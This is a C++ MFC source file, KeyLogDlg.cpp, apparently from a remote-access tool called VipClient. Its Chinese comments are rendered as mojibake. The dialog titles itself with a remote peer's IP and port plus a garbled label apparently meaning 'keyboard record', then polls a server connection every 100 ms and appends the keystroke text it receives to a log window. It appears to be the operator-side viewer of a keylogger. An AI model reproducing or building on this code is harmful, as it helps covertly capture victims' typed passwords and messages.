// KeyLogDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "VipClient.h"
#include "KeyLogDlg.h"
#include ".\keylogdlg.h"


// CKeyLogDlg �Ի���

IMPLEMENT_DYNAMIC(CKeyLogDlg, CDialog)
CKeyLogDlg::CKeyLogDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CKeyLogDlg::IDD, pParent)
{
}

CKeyLogDlg::~CKeyLogDlg()
{
}

void CKeyLogDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_EDIT_KEYLOG, m_EditLog);
}


BEGIN_MESSAGE_MAP(CKeyLogDlg, CDialog)
	ON_BN_CLICKED(IDOK, OnBnClickedOk)
	ON_WM_SIZE()
	ON_WM_TIMER()
END_MESSAGE_MAP()


// CKeyLogDlg ��Ϣ�������

void CKeyLogDlg::OnBnClickedOk()
{
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	OnOK();
}
void CKeyLogDlg::Layout()
{
	if(m_EditLog.GetSafeHwnd())
	{
		CRect rc;
		GetClientRect(&rc);
		m_EditLog.MoveWindow(&rc);
	}
}
BOOL CKeyLogDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// TODO:  �ڴ���Ӷ���ĳ�ʼ��
	WCHAR szIp[100] =L"";
	DWORD dwPort = m_hServer.GetPeer(szIp);
	CString strS; strS.Format(L"%s:%d", szIp, dwPort);
	strS += L"���̼�¼";
	SetWindowText(strS);
	Layout();
	SetTimer(0x1, 100, NULL);
	m_hServer.Statr();
	return TRUE;  // return TRUE unless you set the focus to a control
	// �쳣: OCX ����ҳӦ���� FALSE
}

void CKeyLogDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialog::OnSize(nType, cx, cy);
	Layout();
	// TODO: �ڴ˴������Ϣ����������
}

void CKeyLogDlg::OnTimer(UINT nIDEvent)
{
	// TODO: �ڴ������Ϣ�����������/�����Ĭ��ֵ
	WCHAR szBuf[65535] = {0};
	if(m_hServer.GetString(szBuf))
	{
		CString strText ; m_EditLog.GetWindowText(strText);
		strText += szBuf;
		m_EditLog.SetWindowText(strText);
		m_EditLog.LineScroll(m_EditLog.GetLineCount());
		m_EditLog.SetSel(strText.GetLength(), strText.GetLength());
	}
	CDialog::OnTimer(nIDEvent);
}
